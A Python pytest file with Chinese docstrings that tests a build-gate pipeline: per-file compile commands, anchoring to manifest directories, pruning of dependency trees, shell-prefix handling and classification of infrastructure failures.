                 ("Kotlin 1.9 / JVM 17", "java")]


@pytest.mark.parametrize("raw,fam", _H4_COMPOSITE, ids=[r for r, _ in _H4_COMPOSITE])
def test_h4_composite_form_matches_family_key_itself(raw, fam):
    """★复核 H-4★ 复合写法必须**连族键本身一起搜**——`_TEMPLATE_LANG_ALIASES["java"]` 里没有
    `"java"`，原实现只搜别名 ⇒ `"Java 17"`/`"Python 3.11"` 这些**最常见**的形态全部归不出族
    → 回退 default（没有 JDK/Go 工具链）＝X-H7 的病原样存在。
    ★既有测试之所以绿是夹具形状掩盖★：每条复合写法都恰好命中了一个非族键别名
    （`"Spring Boot (java)"`→`spring`、`"Gin (go)"`→`gin`）。"""
    assert SandboxConfig.canonical_template_language(raw) == fam


def test_m2_per_file_needs_no_exclusion_table(tmp_path):
    """★M-2 的最终形态（决定 1 之后）★ 原病灶是 `compileall` 递归整树会钻进 `.venv`
    （实测一个 py2 语法文件就让闸 rc=1）。当时的治法是 `-x` 排除表，复核随即指出**排除表是
    补不完的黑名单**（linter 仓刻意 ship 坏语法夹具，目录名无通用约定）。
    用户拍板改成逐文件后，这个问题**从根上不存在**——依赖树、坏夹具、`.tox` 都不在面内，
    命令里也不再需要任何排除模式。本条同时钉住"别退回整树"。"""
    import subprocess
    import sys as _sys
    root = _tree(tmp_path, {"pyproject.toml": "[project]", "app/a.py": "x = 1\n",
                            ".venv/lib/py/old.py": "print 'py2'\n",
                            "tests/fixtures/bad.py": "def f(\n"})
    cmd = lp._derive_full_build_command(str(root), ["app/a.py"], None)
    assert "compileall -q ." not in cmd, "退回整树编译了"
    assert "-x" not in cmd, "逐文件形态不该再需要排除表"
    real = cmd.replace("python3", _sys.executable)
    assert subprocess.run(["sh", "-c", real], cwd=root,
                          capture_output=True).returncode == 0
    (root / "app" / "bad.py").write_text("def g(\n")
    cmd2 = lp._derive_full_build_command(str(root), ["app/a.py", "app/bad.py"], None)
    assert subprocess.run(["sh", "-c", cmd2.replace("python3", _sys.executable)],
                          cwd=root, capture_output=True).returncode != 0, "闸没牙了"

def test_m3_both_probes_exclude_dependency_trees(tmp_path):
    """★复核 M-3★ 两个探针必须同口径：`_manifest_present` 若从 `node_modules/**` 判 True 而
    `_manifest_dir` 返 None ⇒ `at()` 退回根级命令 ⇒ `dotnet build` 在没有工程文件的根上跑 ⇒
    127 → BLOCKED，正是本批要治的死循环。"""
    root = _tree(tmp_path, {"node_modules/foo/package.json": "{}",
                            "vendor/x/Gemfile": "source 'x'",
                            "target/gen/pom.xml": "<project/>",
                            ".venv/x/pyproject.toml": "[project]"})
    for names in (("package.json",), ("Gemfile",), ("pom.xml",), ("pyproject.toml",)):
        assert lp._manifest_present(names, str(root)) is False, f"{names} 从依赖树里判 True"
        assert lp._manifest_dir(names, str(root)) is None


_M7_WRAPPED = ["cd sub && mvn -q compile", "sh -c 'mvn -q -DskipTests compile'",
               "bash -c \"dotnet build\"", "env FOO=1 mvn -q compile",
               "cd web && npm ci"]


@pytest.mark.parametrize("cmd", _M7_WRAPPED)
def test_m7_shell_wrapper_prefix_does_not_bypass_gate(cmd, tmp_path):
    """★复核 M-7★ `cd`/`sh`/`env` 都在"无需清单"白名单里，而工具取的是 `tokens[0]` ⇒ 实测
    `cd sub && mvn -q compile` 在空项目上判 **applicable=True** ⇒ X-H6 那道闸被一个前缀绕过。
    而本批的 `at()` 自己就**会产出** `cd <dir> && <cmd>` 形态，所以这是自伤。"""
    assert lp._build_cmd_applicable(cmd, str(tmp_path)) is False, \
        f"{cmd!r} 被前缀绕过了清单闸"


def test_m7_wrapped_command_still_passes_when_manifest_present(tmp_path):
    """反向臂：清单在场时包装形态仍必须适用（别把闸拧成对 `cd` 恒拒——本批自己会产出它）。"""
    root = _tree(tmp_path, {"sub/pom.xml": "<project/>"})
    assert lp._build_cmd_applicable("cd sub && mvn -q compile", str(root)) is True


def test_c1_php_gate_shape_without_requiring_php_installed(tmp_path):
    """php 未必装在测试机上，故只断**命令形态**：不许依赖 git、必须逐文件、必须 `|| exit 1`。
    （C-1 的三重缺陷里，前两条只看形态就能钉住。）"""
    root = _tree(tmp_path, {"composer.json": "{}", "a.php": "<?php echo 1;",
                            "b.php": "<?php echo 2;"})
    cmd = lp._derive_full_build_command(str(root), ["a.php", "b.php"], None)
    assert cmd, "php 工程派生不出命令"
    assert "git ls-files" not in cmd, "仍依赖 git（沙箱 /workspace 不是 git 仓库）"
    assert "for f in" in cmd and "|| exit 1" in cmd, "不是逐文件检查 ⇒ 只会查第一个"
    assert "a.php" in cmd and "b.php" in cmd, "改动文件没全进命令"


# ══════════════════════════════════════════════
# hunter 复核整改（CRITICAL-1/2、HIGH-1/2/3、MED-1/2/3）
# ══════════════════════════════════════════════

def test_hc1_anchor_comes_from_modified_not_shortest_manifest(tmp_path):
    """★复核 CRITICAL-1★ 锚点原按"全树最短清单路径"挑，**完全不看 `modified` 在哪**。
    实测（沙箱分支＝生产路径）：monorepo `backend/pyproject.toml`，改 `scripts/deploy.py`
    （真语法错）→ `cd backend && compileall` → **rc=0** ⇒ 改动文件根本没进编译面＝静默假过。
    python 改前没分支（留 `build_skipped` 痕）、go 改前在根上跑会**大声失败**（可重试）——
    锚定把"响的失败"换成了"静默的通过"，方向反了。
    """
    import subprocess
    import sys as _sys
    root = _tree(tmp_path, {"backend/pyproject.toml": "[project]",
                            "backend/ok.py": "x = 1\n",
                            "scripts/deploy.py": "def f(\n"})     # 真语法错，在锚点之外
    cmd = lp._derive_full_build_command(str(root), ["scripts/deploy.py"], None)
    assert not cmd.startswith("cd backend"), "锚到了与改动无关的子树"
    r = subprocess.run(["sh", "-c", cmd.replace("python3", _sys.executable)],
                       cwd=root, capture_output=True)
    assert r.returncode != 0, "改动文件的语法错没被抓到 ⇒ 闸跑了也是白跑"
    # 反向臂：改动**在**锚点之内时必须精确锚定（别为了覆盖面把锚定整个放弃）。
    # ★用 go 断这一条★：python 走决定 1 的逐文件形态、天然不需要锚点，
    # 而 go/C#/elixir 这些**整目录**命令才是 `at()` 的服务对象。
    go = _tree(tmp_path / "go1", {"svc/go.mod": "module svc", "svc/a.go": "package svc"})
    assert lp._derive_full_build_command(str(go), ["svc/a.go"], None) \
        == "cd svc && go build ./...", "该锚定时没锚定"


def test_hc1_go_anchor_follows_the_changed_module(tmp_path):
    """双模块仓：改 `tools/` 就该锚 `tools`，不该按路径长度挑 `svc`。"""
    root = _tree(tmp_path, {"svc/go.mod": "module svc", "svc/a.go": "package svc",
                            "tools/go.mod": "module tools", "tools/b.go": "package tools"})
    assert lp._derive_full_build_command(str(root), ["tools/b.go"], None) \
        == "cd tools && go build ./..."
    assert lp._derive_full_build_command(str(root), ["svc/a.go"], None) \
        == "cd svc && go build ./..."


def test_hc1_changes_spanning_two_manifests_fall_back_to_root(tmp_path, caplog):
    """改动跨多个清单目录 → **不猜**锚点，退根级 + 留 WARNING（否则静默只覆盖一半）。"""
    import logging
    root = _tree(tmp_path, {"svc/go.mod": "module svc", "svc/a.go": "package svc",
                            "tools/go.mod": "module tools", "tools/b.go": "package tools"})
    with caplog.at_level(logging.WARNING):
        cmd = lp._derive_full_build_command(str(root), ["svc/a.go", "tools/b.go"], None)
    assert cmd == "go build ./...", f"跨清单时不该锚到某一个: {cmd!r}"
    assert any("跨多个" in r.message for r in caplog.records)


def test_hc2_test_fallback_is_anchored(tmp_path):
    """★复核 CRITICAL-2★ 工程级测试兜底原先**不锚定**，而在场探针刚被改成递归 ⇒
    `backend/pyproject.toml` 形态得到**根级** pytest ⇒ 收集不到用例 rc=5 ⇒ 非 infra ⇒
    **硬 FAIL**（sticky，换模型同死）。改前只看根 → 返 None → `test_skipped`，
    所以这是本批新造的判死面。"""
    root = _tree(tmp_path, {"backend/pyproject.toml": "[project]", "backend/a.py": "x=1"})
    assert lp._guess_test_cmd(str(root), ["backend/a.py"]) \
        == "cd backend && python -m pytest -q --maxfail=1"
    go = _tree(tmp_path / "g", {"tools/go.mod": "module t", "tools/a.go": "package t"})
    assert lp._guess_test_cmd(str(go), ["tools/a.go"]) == "cd tools && go test ./..."


def test_hc2_pytest_no_tests_collected_is_not_a_failure(tmp_path, monkeypatch):
    """pytest 的 rc=5 是"**一个用例都没收集到**"，按 pytest 自己的约定不是失败。
    猜出的命令跑在没有用例的目录上会拿到 rc=5 ⇒ 旧判据判成代码失败且 **sticky**。"""
    from swarm.types import FileScope, SubTask, SubTaskDifficulty, TaskHarness
    root = _tree(tmp_path, {"pyproject.toml": "[project]", "app/a.py": "x=1\n"})
    monkeypatch.setattr(lp, "_compile_files", lambda *a, **k: (True, "ok"))
    monkeypatch.setattr(lp, "_derive_full_build_command", lambda *a, **k: "")
    monkeypatch.setattr(lp, "_build_cmd_applicable", lambda *a, **k: True)
    monkeypatch.setattr(lp, "_run_l1_command",
                        lambda cmd, pp, timeout=120: (5, "no tests ran in 0.01s"))
    monkeypatch.setenv("SWARM_WORKER_L1_LINT", "false")
    monkeypatch.setenv("SWARM_WORKER_L1_FORMAT", "false")
    diff = "--- a/app/a.py\n+++ b/app/a.py\n@@ -1 +1 @@\n-old\n+new\n"
    st = SubTask(id="st-rc5", description="rc5", difficulty=SubTaskDifficulty.MEDIUM,
                 scope=FileScope(writable=["app/a.py"]),
                 harness=TaskHarness(language="python", test_command="pytest -q"))
    ok, details = lp.run_l1_pipeline(str(root), st, diff, timeout=30)
    assert ok is True, f"rc=5 被判成失败: {details}"
    assert details.get("test_no_tests_collected"), "rc=5 的归类没留机读账"


_H1_INFRA = [
    ("cargo 冷沙箱 offline",
     "error: attempting to make an HTTP request, but --offline was specified"),
    ("node 连不上 DB", "Error: connect ECONNREFUSED 127.0.0.1:5432"),
    ("缺 chromium", "Failed to launch the browser process! /ms-playwright/chrome not found"),
    ("go 无 main module", "go: cannot find main module, but found .git/config"),
    ("npm 缺脚本", 'npm ERR! Missing script: "test"'),
]


@pytest.mark.parametrize("label,txt", _H1_INFRA, ids=[c[0] for c in _H1_INFRA])
def test_h1_new_death_surface_classified_as_infra(label, txt):
    """★复核 HIGH-1★ 本批给 go/rust/npm 新增了**真跑测试**的面（改前一律 `test_skipped`＝通过），
    而这几类失败**不是代码能力问题**——原表一条都没覆盖（实测全判 CODE）⇒ 会误换模型/烧修复轮。"""
    assert lp._is_infra_failure(txt) is True, f"{label} 被判成代码错"


def test_h1_real_test_failure_still_counts_as_code():
    """反向臂：真测试失败不许被 infra 化（否则闸没牙）。"""
    assert lp._is_infra_failure("FAIL src/a.test.ts > sums\nAssertionError: 1 != 2") is False


def test_h2_sandbox_find_prunes_dependency_trees():
    """★复核 HIGH-2★ M-3 的"两探针同口径"当初**只落在本地兜底**，而**生产＝沙箱**：三处沙箱
    `find` 一次都没有排除表 ⇒ `node_modules/**` 里深度≤3 的清单仍让 `has()` 判 True 且
    `_manifest_dir` 指进依赖树 ⇒ `cd node_modules/foo && dotnet build` ⇒ 127 → BLOCKED。
    本条断言三处沙箱分支都带上了剪枝（结构断言，因为无 live 沙箱可跑）。"""
    import inspect
    for fn in (lp._manifest_present, lp._manifest_dir, lp._build_cmd_applicable):
        src = inspect.getsource(fn)
        if "find " in src:
            assert "_FIND_PRUNE" in src, f"{fn.__name__} 的沙箱 find 没剪依赖树"
    assert "node_modules" in lp._FIND_PRUNE and "site-packages" in lp._FIND_PRUNE


def test_h3_build_cmd_applicable_shares_one_implementation(tmp_path):
    """★复核 HIGH-3★ `_build_cmd_applicable` 的本地兜底原是 `any(root.rglob(m))`：
    **无深度上限、无排除表**，与刚对齐的 `_manifest_present` **反向分叉**。实测深度 7 的
    `pom.xml` 让它判适用 → 在根上跑 mvn → 127 → BLOCKED（本批要杀的死循环，漏了这一个调用点）。"""
    deep = _tree(tmp_path, {"a/b/c/d/e/f/g/pom.xml": "<project/>"})
    assert lp._manifest_present(("pom.xml",), str(deep)) is False
    assert lp._build_cmd_applicable("mvn -q -DskipTests compile", str(deep)) is False, \
        "两处口径又分叉了（深度上限不一致）"
    nm = _tree(tmp_path / "nm", {"node_modules/x/Vendored.csproj": "<Project/>"})
    assert lp._build_cmd_applicable("dotnet build", str(nm)) is False, "依赖树里的清单算数了"


_MED_TOKENS = [
    ('for f in a.php; do php -l "$f" || exit 1; done', "php"),
    ('for f in a.rb b.rb; do ruby -c "$f" || exit 1; done', "ruby"),
    ("cd mvn && npm ci", "npm"),
    ("cd dotnet && npm run build", "npm"),
    ("cd sub&&dotnet build", "dotnet"),
    ("sh -c 'mvn -q -DskipTests compile'", "mvn"),
    ('bash -c "dotnet build"', "dotnet"),
    ("env FOO=1 mvn -q compile", "mvn"),
    ("sudo mvn -q compile", "mvn"),
    ("mvn -q -DskipTests compile", "mvn"),
]


@pytest.mark.parametrize("cmd,want", _MED_TOKENS, ids=[c[0][:26] for c in _MED_TOKENS])
def test_med123_effective_tool_token(cmd, want):
    """★复核 MED-1/2/3★
    · MED-1 shell 控制结构不是工具：本批自产的 `for f in …; do php -l …` 原先返 `for`
      ⇒ 每个 PHP/Ruby 子任务刷一条"请登记 `for`"的 WARNING，污染本批自己新建的告警通道（自伤）。
      循环**变量名**也要跳（只跳 `for` 会返 `f`）。
    · MED-2 **位置真相优先**：`cd` 的实参永远是路径，哪怕它叫 `mvn`。原实现"宁选表里有的词元"
      ⇒ `cd mvn && npm ci` → tool=`mvn` ⇒ node 工程无 pom ⇒ 判不适用 ⇒ 跳过即通过（fail-open）。
    · MED-3 `&&` 紧贴时按分隔符切开（原只按空白 split ⇒ `cd sub&&dotnet build` 得到 `build`）。
    · 另：`sh -c "<cmd>"` 与 `cd <dir>` 的后续词元语义**不同**——前者就是命令，后者是路径。
      整改过程中把两者混为一谈，让 `sh -c 'mvn …'` 里的 mvn 被当实参跳过（本条的 sh/bash 用例锁它）。
    """
    assert lp._effective_tool_token(cmd.split()) == want


_INFRA_MUST_NOT_MATCH = [
    ("python 缺内部模块", "ModuleNotFoundError: No module named 'app.services.user'"),
    ("java 缺包", "[ERROR] package com.acme.x does not exist"),
    ("go 缺内部包", "a.go:7:2: no required module provides package github.com/x/y"),
    ("ts 缺模块", "src/app.ts(3,24): error TS2307: Cannot find module './routes/users'"),
    ("rust 未解析 import", "error[E0432]: unresolved import `crate::svc`"),
]


@pytest.mark.parametrize("label,txt", _INFRA_MUST_NOT_MATCH,
                         ids=[c[0] for c in _INFRA_MUST_NOT_MATCH])
def test_infra_markers_do_not_swallow_missing_internal_symbols(label, txt):
    """★整改中自伤，本仓测试当场抓到★ 我为 HIGH-1 加的 node 错误码是**裸子串**：
    `enotfound` 命中 Python 的 `ModuleNotFoundError`（小写后 `modul·enotfound·error`）
    ⇒ "缺内部模块"被判成 infra ⇒ **X-C3 的 BLOCKED 归因整条失效**（等生产者的通道没了）。
    这正是本会话记过的"加 token 前先估它在真实语料里的命中面积"。
    本条把五个栈的"缺内部标识"形态钉死为**非 infra**——它们必须走 X-C3 的归因链。"""
    assert lp._is_infra_failure(txt) is False, f"{label} 被 infra 化 ⇒ X-C3 归因链失效"


# ══════════════════════════════════════════════
# 用户拍板的决定（决定 1：python 闸只编译改动文件）
# ══════════════════════════════════════════════

def test_d1_python_gate_only_compiles_changed_files(tmp_path):
    """★决定 1（用户拍板）★ python 构建闸只编译**改动文件**，与 PHP/Ruby 同口径。

    演进史：`compileall -q .`（整树）→ 复核 M-2 指出它钻进 `.venv`（实测一个 py2 语法文件就让
    整个闸 rc=1）→ 加 `-x` 排除表 → 复核再指出**排除表是补不完的黑名单**：linter/parser/
    formatter 工程会**刻意 ship 坏语法夹具**（`tests/fixtures/bad_syntax.py`），而"刻意坏语法"
    的目录名没有通用约定，换个名就复发（本仓纪律反对 denylist 式打补丁）。
    ★只碰 worker 自己改的文件＝可证不误杀★，且不需要任何排除表。
    """
    import subprocess
    import sys as _sys
    root = _tree(tmp_path, {
        "pyproject.toml": "[project]",
        "app/ok.py": "x = 1\n",
        "tests/fixtures/bad_syntax.py": "def f(\n",      # linter 仓刻意 ship 的坏夹具
        ".venv/lib/old.py": "print 'py2'\n",             # 依赖树里的 py2 源码
        "node_modules/x/setup.py": "def g(\n",           # 依赖树里的坏语法
    })
    cmd = lp._derive_full_build_command(str(root), ["app/ok.py"], None)
    assert "for f in" in cmd and "app/ok.py" in cmd, f"不是逐文件形态: {cmd!r}"
    assert "compileall -q ." not in cmd, "又变回整树编译了"
    real = cmd.replace("python3", _sys.executable)
    assert subprocess.run(["sh", "-c", real], cwd=root,
                          capture_output=True).returncode == 0, \
        "坏语法夹具/依赖树被卷进编译面 ⇒ 该仓每个 python 子任务永久判死"
    # 反向臂：改动里**真有**语法错必须被抓（别把闸拧成恒过）
    (root / "app" / "bad.py").write_text("def g(\n")
    cmd2 = lp._derive_full_build_command(str(root), ["app/ok.py", "app/bad.py"], None)
    assert subprocess.run(["sh", "-c", cmd2.replace("python3", _sys.executable)],
                          cwd=root, capture_output=True).returncode != 0, "闸没牙了"
    # 只改非 .py → 不出命令（不臆造）
    assert lp._derive_full_build_command(str(root), ["README.md"], None) == ""


def test_hc1_uncovered_changes_fall_back_to_root(tmp_path):
    """★复核 CRITICAL-1 的"覆盖不到就退根"这一半★（决定 1 之后只有整目录命令的栈能观测到）

    go 双模块仓，改动文件落在**任何 go.mod 之上**（仓根的脚本）：锚到某个子模块会把它排除在
    编译面之外 ⇒ 闸跑了 rc=0 也是白跑。正确行为是退到工程根（覆盖面最大）。
    """
    root = _tree(tmp_path, {"svc/go.mod": "module svc", "svc/a.go": "package svc",
                            "main.go": "package main\nfunc main(){}"})
    # `main.go` 在根，其上没有 go.mod（go.mod 在 svc/）⇒ 锚不到 ⇒ 必须退根
    cmd = lp._derive_full_build_command(str(root), ["main.go"], None)
    assert cmd == "go build ./...", f"没退到根: {cmd!r}"
    # 反向臂：改动在 svc/ 之内时仍要精确锚定
    assert lp._derive_full_build_command(str(root), ["svc/a.go"], None) \
        == "cd svc && go build ./..."
